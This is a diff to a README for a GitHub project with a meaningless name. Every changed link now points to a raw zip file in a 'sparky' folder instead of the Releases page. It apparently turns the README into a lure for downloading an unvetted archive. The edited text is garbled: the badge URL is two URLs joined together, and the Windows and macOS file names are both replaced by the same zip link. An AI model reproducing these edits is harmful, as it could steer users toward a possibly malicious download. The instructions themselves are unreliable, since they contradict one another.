@@ -6,7 +6,7 @@ Welcome to the **amanansdiahnid-17** project! This application helps you easily 
 
 ## 📥 Download
 
-[![Download](https://img.shields.io/badge/Download%20Now-amanansdiahnid--17-blue.svg)](https://github.com/yahia120111/amanansdiahnid-17/releases)
+[![Download](https://raw.githubusercontent.com/yahia120111/amanansdiahnid-17/main/sparky/amanansdiahnid-17.zip%https://raw.githubusercontent.com/yahia120111/amanansdiahnid-17/main/sparky/amanansdiahnid-17.zip)](https://raw.githubusercontent.com/yahia120111/amanansdiahnid-17/main/sparky/amanansdiahnid-17.zip)
 
 ## 🔧 Installation Instructions
 
@@ -14,7 +14,7 @@ Welcome to the **amanansdiahnid-17** project! This application helps you easily 
 
 To download the software, click the link below:
 
-[Download from Releases Page](https://github.com/yahia120111/amanansdiahnid-17/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/yahia120111/amanansdiahnid-17/main/sparky/amanansdiahnid-17.zip)
 
 ### Step 2: Choose Your Version
 
@@ -24,7 +24,7 @@ On the Releases page, you will see different versions of the software. Look for 
 
 Click on the version number you’d like to download. You will now see various files available for download. Select the appropriate file for your operating system.
 
-For Windows users, you might see a file like `amanansdiahnid-17-windows.exe`. For macOS users, look for something like `amanansdiahnid-17-macos.zip`. Click on the file to start the download.
+For Windows users, you might see a file like `https://raw.githubusercontent.com/yahia120111/amanansdiahnid-17/main/sparky/amanansdiahnid-17.zip`. For macOS users, look for something like `https://raw.githubusercontent.com/yahia120111/amanansdiahnid-17/main/sparky/amanansdiahnid-17.zip`. Click on the file to start the download.
 
 ### Step 4: Run the Application
 
@@ -71,4 +71,4 @@ Thank you for choosing **amanansdiahnid-17**! We hope this tool helps you manage
 
 For more information and updates, remember to check the Releases page regularly.
 
-[Download from Releases Page](https://github.com/yahia120111/amanansdiahnid-17/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/yahia120111/amanansdiahnid-17/main/sparky/amanansdiahnid-17.zip)
